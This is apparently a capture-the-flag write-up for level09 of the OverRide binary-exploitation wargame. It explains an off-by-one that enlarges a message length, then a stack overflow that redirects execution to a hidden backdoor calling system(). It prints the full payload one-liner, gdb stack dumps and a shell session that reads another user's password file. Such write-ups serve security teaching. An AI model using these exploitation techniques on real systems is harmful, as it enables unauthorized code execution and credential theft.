## Solution

```
(python -c "print 'A' * 40 + '\xff' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat -) | ./level09
```  


## Execution

```
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: cboutier
>: Welcome, cboutier
>: Msg @Unix-Dude
>>: hello
>: Msg sent!
```

## Explanation

```
info func
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
```

There is a struct as it is accessing the username by doing param+140, and it is accessing the message length, by doing param+180.
```
struct input
{
	char msg[140]; 		// param
	char username[40];	// param+140
	int len;			// param+180
}
```
There is an uncalled secret_backdoor function, which calls system with an input from the user as argument.  
We want to rewrite EIP so it calls this secret_backdoor function.  

In the set_username function, the copy of the username is not correctly done.
It is copying i <=40 chars, and not i < 40 as it should (username[40]). So we can overwrite the byte following username[40], which will be the length of the message, as we are in a struct.  


Let's find the offset, to know from where we can overwrite:  
```
(gdb) b *0x000055555555492b		// @ puts in handle_msg(), need to run the program once, to get the correct addresses
Breakpoint 1 at 0x55555555492b
(gdb) r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAA
>: Welcome, AAAA
>: Msg @Unix-Dude
>>: BBBB

Breakpoint 1, 0x000055555555492b in handle_msg ()
(gdb) x/100wx $rsp
0x7fffffffe500:	0x42424242	0x0000000a	0x00000000	0x00000000		--> Message starts at 0x7fffffffe500
0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe560:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe570:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe580:	0x00000000	0x00000000	0x00000000	0x41414141		--> username starts at 0x7fffffffe58c
0x7fffffffe590:	0x0000000a	0x00000000	0x00000000	0x00000000
0x7fffffffe5a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe5b0:	0x00000000	0x0000008c	0xffffe5d0	0x00007fff		--> len is at 0x7fffffffe5b4 (0x8c = 140)
0x7fffffffe5c0:	0xffffe5d0	0x00007fff	0x55554abd	0x00005555
0x7fffffffe5d0:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff

(gdb) info frame
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x55555555492b in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe5c0, args: 
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8 <--
```

--> our struct starts at 0x7fffffffe500, and the rip we want to overwrite is at 0x7fffffffe5c8.
```
(gdb) p 0x7fffffffe5c8-0x7fffffffe500
$7 = 200
```

The offset is 200, from the message input.

However, the length is set at 140, and is used in strncpy in set_message.  
We can try to increase the size of the message by taking advantage of the <= 40 check, that allows us to overwrite 1 byte. Let's overwrite it to the max, which is `\xff`.  
Secret_backdoor address:  
`0x000055555555488c  secret_backdoor`

So, the payload will look like this:  
- 40 bytes to fill the username buffer -> 'A' * 40
- 1 byte to overwrite len -> \xff
- a new line to "validate" the username -> '\n'
- 200 bytes to fill the message buffer until we reach the RIP -> "A" * 200
- the address of secret_backdoor() -> \x8c\x48\x55\x55\x55\x55\x00
- a new line to "vaidate" the message -> '\n'
- the system() call on the secret_backdoor takes as an argument an input -> '/bin/sh'

```
(python -c "print 'A' * 40 + '\xff' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

level09@OverRide:~$ su end
Password: 
end@OverRide:~$ ls
end
end@OverRide:~$ cat end 
GG !
```